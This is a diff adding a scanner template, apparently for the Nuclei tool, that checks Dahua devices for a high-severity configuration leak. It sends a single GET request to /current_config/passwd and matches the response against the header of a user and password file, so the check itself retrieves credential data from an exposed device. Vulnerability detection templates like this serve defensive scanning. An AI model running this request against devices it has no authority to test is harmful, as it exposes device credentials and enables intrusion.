@@ -1,0 +1,22 @@
+id: DaHua-ConfigInfo-Leak
+
+info:
+  name: 大华配置信息泄露
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      GET /current_config/passwd HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+      Accept: */*
+      Accept-Encoding: gzip
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "id:name:passwd:groupid:authority:memo:share:bandlimit:mac:timesection"
